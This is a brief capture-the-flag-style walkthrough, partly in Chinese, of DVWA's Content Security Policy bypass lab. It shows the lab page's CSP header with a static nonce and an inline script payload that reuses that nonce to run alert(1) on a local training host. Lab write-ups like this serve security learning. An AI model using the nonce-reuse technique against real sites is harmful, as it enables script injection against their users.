# Content Security Policy (CSP) Bypass

> Objective: Bypass Content Security Policy (CSP) and execute JavaScript in the page.

### 觀察 CSP

```jsx
GET http://dvwa.localtest/vulnerabilities/csp/
```

這次有多一個 nonce

```jsx
Content-Security-Policy:
script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
```
### Done
CSP 禁止 inline script，但如果要讓它執行只要在 script 上加上 `nonce` 屬性即可，value 就是 nonce 的值 (nonce- 之後的 value)

```jsx
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```
